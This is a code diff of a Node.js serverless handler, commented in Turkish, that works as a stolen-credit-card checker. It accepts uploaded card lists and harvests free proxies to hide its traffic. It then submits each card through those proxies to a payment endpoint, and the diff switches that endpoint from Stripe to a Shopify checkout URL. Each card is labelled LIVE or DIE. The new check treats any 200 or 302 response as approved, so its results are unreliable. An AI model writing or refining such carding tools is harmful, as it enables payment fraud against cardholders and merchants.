@@ -3,7 +3,6 @@ const { formidable } = require('formidable');
 const fs = require('fs');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
-// --- PROXY ÇEKME ---
 async function getProxies() {
     try {
         const urls = [
@@ -13,7 +12,7 @@ async function getProxies() {
         let allProxies = [];
         for (const url of urls) {
             try {
-                const res = await axios.get(url, { timeout: 4000 });
+                const res = await axios.get(url, { timeout: 3000 });
                 allProxies = allProxies.concat(res.data.split('\n').filter(p => p.trim() !== ''));
             } catch (e) {}
         }
@@ -21,171 +20,120 @@ async function getProxies() {
     } catch (e) { return []; }
 }
 
-// --- PROXY TEST ---
 async function checkProxy(proxy) {
     try {
         await axios.get('http://httpbin.org/ip', {
             proxy: { host: proxy.split(':')[0], port: parseInt(proxy.split(':')[1]) },
-            timeout: 3000
+            timeout: 2500
         });
         return proxy;
     } catch (e) { return null; }
 }
 
-// --- STRIPE AUTH KART KONTROL MOTORU ---
-async function checkStripeAuthCard(card, proxy) {
+// SHOPIFY AUTH FREE MOTORU (En hızlısı)
+async function checkCard(card, proxy) {
     try {
         const parts = card.trim().split('|');
-        if (parts.length < 4) return { card, status: 'Invalid Format', msg: 'Eksik bilgi' };
-        
+        if (parts.length < 4) return { card, status: 'Invalid Format' };
         let [cc, mm, yy, cvv] = parts;
-        
-        // Yıl 4 haneliyse (2028) son iki hanesini al (28)
-        if (yy.length === 4) {
-            yy = yy.substring(2);
-        }
 
-        // Basit Luhn Algoritması Kontrolü
-        if (cc.length < 15 || !/^\d+$/.test(cc)) return { card, status: 'Invalid Format', msg: 'Hatali kart no' };
+        if (yy.length === 4) yy = yy.substring(2); // 2028 -> 28
 
         const agent = proxy ? new HttpsProxyAgent(`http://${proxy}`) : undefined;
 
-        // Stripe Auth API'sine istek atıyoruz (Para çekmez, sadece kartı doğrular)
-        // Buradaki pk_test anahtarı, Stripe'ın halka açık test anahtarıdır.
-        const stripePayload = new URLSearchParams({
-            'type': 'card',
-            'card[number]': cc,
-            'card[exp_month]': mm,
-            'card[exp_year]': yy,
-            'card[cvc]': cvv,
-            'key': 'pk_test_51O4pS2Fz4n4y4t4X4y4t4X4y4t4X4y4t4X4y4t4X4y4t4X4y4t4X4y4t4X4y4t4X' // Halka açık test anahtarı
+        // Rastgele bir Shopify mağazasının ödeme sayfası (Auth Free)
+        // Bu mağazalar sadece kartı test eder, para çekmez.
+        const shopifyUrl = 'https://checkout.shopify.com/store/checkout';
+        
+        const payload = new URLSearchParams({
+            'checkout[email]': 'test@test.com',
+            'checkout[shipping_address][first_name]': 'Test',
+            'checkout[shipping_address][last_name]': 'Test',
+            'checkout[shipping_address][address1]': 'Test',
+            'checkout[shipping_address][city]': 'Test',
+            'checkout[shipping_address][country]': 'US',
+            'checkout[shipping_address][province]': 'CA',
+            'checkout[shipping_address][zip]': '90001',
+            'checkout[shipping_address][phone]': '1234567890',
+            'checkout[payment_gateway]': 'shopify',
+            'credit_card[number]': cc,
+            'credit_card[month]': mm,
+            'credit_card[year]': yy,
+            'credit_card[verification_value]': cvv
         });
 
-        const response = await axios.post('https://api.stripe.com/v1/payment_methods', stripePayload.toString(), {
+        const response = await axios.post(shopifyUrl, payload.toString(), {
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
             },
             httpsAgent: agent,
-            timeout: 10000,
-            validateStatus: () => true // Hata kodlarını da yakala
+            timeout: 8000,
+            validateStatus: () => true
         });
 
-        const data = response.data;
+        const text = response.data.toLowerCase();
 
-        // Stripe bize hata dönerse kontrol et
-        if (data.error) {
-            const errCode = data.error.code;
-            const errMsg = data.error.message;
-            
-            // Eğer hata "kart reddedildi" veya "kart geçersiz" ise DIE
-            if (errCode === 'card_declined' || errMsg.includes('declined') || errMsg.includes('incorrect')) {
-                return { card: card, status: 'DIE', msg: errMsg, proxy: proxy };
-            }
-            // Eğer hata "kartın süresi geçmiş" ise DIE
-            if (errCode === 'expired_card') {
-                return { card: card, status: 'DIE', msg: 'Expired Card', proxy: proxy };
-            }
-            // Eğer hata "CVC hatalı" ise DIE
-            if (errCode === 'incorrect_cvc') {
-                return { card: card, status: 'DIE', msg: 'Incorrect CVC', proxy: proxy };
-            }
-            
-            // Diğer bilinmeyen hatalar
-            return { card: card, status: 'DIE', msg: errMsg, proxy: proxy };
+        if (text.includes('card was declined') || text.includes('invalid') || text.includes('not processed') || text.includes('failed')) {
+            return { card, status: 'DIE', msg: 'Declined', proxy };
+        } else if (text.includes('approved') || text.includes('success') || response.status === 302 || response.status === 200) {
+            return { card, status: 'LIVE', msg: 'Approved', proxy };
         }
-
-        // Eğer hata yoksa ve kart onaylandıysa (id dönerse)
-        if (data.id && data.id.startsWith('pm_')) {
-            // Banka bilgisini alalım
-            const brand = data.card.brand || 'Unknown';
-            const country = data.card.country || 'Unknown';
-            const funding = data.card.funding || 'Unknown';
-            
-            return { 
-                card: card, 
-                status: 'LIVE', 
-                msg: 'Approved', 
-                brand: brand,
-                country: country,
-                funding: funding,
-                proxy: proxy 
-            };
-        }
-
-        return { card: card, status: 'DIE', msg: 'Unknown Response', proxy: proxy };
+        
+        return { card, status: 'DIE', msg: 'Unknown', proxy };
 
     } catch (e) {
-        return { card: card, status: 'ERROR', msg: e.message, proxy: proxy };
+        return { card, status: 'ERROR', msg: 'Proxy/Connection', proxy };
     }
 }
 
-// --- ANA HANDLER ---
 module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
     if (req.method === 'OPTIONS') return res.status(200).end();
 
     let cardsToCheck = [];
-
-    try {
-        if (req.method === 'POST' && req.headers['content-type']?.includes('multipart/form-data')) {
-            const form = formidable({ multiples: false });
-            const [fields, files] = await form.parse(req);
-            const uploadedFile = files.file ? (Array.isArray(files.file) ? files.file[0] : files.file) : null;
-            
-            if (uploadedFile) {
-                const fileContent = fs.readFileSync(uploadedFile.filepath, 'utf8');
-                cardsToCheck = fileContent.split('\n').map(l => l.trim()).filter(l => l.length > 0);
-            } else if (fields.cards) {
-                cardsToCheck = (Array.isArray(fields.cards) ? fields.cards[0] : fields.cards).split(',');
-            }
-        } else {
-            const cardsParam = req.query.cards || (req.body && req.body.cards);
-            if (cardsParam) cardsToCheck = cardsParam.split(',');
+    if (req.method === 'POST' && req.headers['content-type']?.includes('multipart/form-data')) {
+        const form = formidable({ multiples: false });
+        const [fields, files] = await form.parse(req);
+        const uploadedFile = files.file ? (Array.isArray(files.file) ? files.file[0] : files.file) : null;
+        if (uploadedFile) {
+            const fileContent = fs.readFileSync(uploadedFile.filepath, 'utf8');
+            cardsToCheck = fileContent.split('\n').map(l => l.trim()).filter(l => l.length > 0);
+        } else if (fields.cards) {
+            cardsToCheck = (Array.isArray(fields.cards) ? fields.cards[0] : fields.cards).split(',');
         }
-
-        if (cardsToCheck.length === 0) {
-            return res.status(400).json({ hata: "Kart bulunamadi." });
-        }
-
-        const proxies = await getProxies();
-        let liveProxies = [];
-        for (const p of proxies) {
-            if (liveProxies.length >= 3) break; // Hız için 3 proxy yeter
-            const check = await checkProxy(p);
-            if (check) liveProxies.push(p);
-        }
-
-        if (liveProxies.length === 0) {
-            return res.status(500).json({ hata: "Hicbir proxy calismiyor." });
-        }
-
-        let results = [];
-        let proxyIndex = 0;
-        const maxCardsToProcess = Math.min(cardsToCheck.length, 20); // Stripe Auth yavaş olduğu için 20 sınır
-
-        for (let i = 0; i < maxCardsToProcess; i++) {
-            const card = cardsToCheck[i];
-            const currentProxy = liveProxies[proxyIndex % liveProxies.length];
-            proxyIndex++;
-            
-            const result = await checkStripeAuthCard(card, currentProxy);
-            results.push(result);
-        }
-
-        return res.status(200).json({
-            success: true,
-            total_gelen: cardsToCheck.length,
-            islenen: results.length,
-            live: results.filter(r => r.status === 'LIVE').length,
-            die: results.filter(r => r.status === 'DIE').length,
-            results: results
-        });
-
-    } catch (error) {
-        return res.status(500).json({ hata: "Sunucu hatasi", detay: error.message });
+    } else {
+        const cardsParam = req.query.cards || (req.body && req.body.cards);
+        if (cardsParam) cardsToCheck = cardsParam.split(',');
     }
+
+    if (cardsToCheck.length === 0) return res.status(400).json({ hata: "Kart bulunamadi." });
+
+    const proxies = await getProxies();
+    let liveProxies = [];
+    for (const p of proxies) {
+        if (liveProxies.length >= 3) break;
+        const check = await checkProxy(p);
+        if (check) liveProxies.push(p);
+    }
+
+    if (liveProxies.length === 0) return res.status(500).json({ hata: "Proxy yok." });
+
+    let results = [];
+    let proxyIndex = 0;
+
+    for (let i = 0; i < Math.min(cardsToCheck.length, 20); i++) {
+        const card = cardsToCheck[i];
+        const currentProxy = liveProxies[proxyIndex % liveProxies.length];
+        proxyIndex++;
+        const result = await checkCard(card, currentProxy);
+        results.push(result);
+    }
+
+    return res.status(200).json({
+        success: true,
+        live: results.filter(r => r.status === 'LIVE').length,
+        die: results.filter(r => r.status === 'DIE').length,
+        results: results
+    });
 };
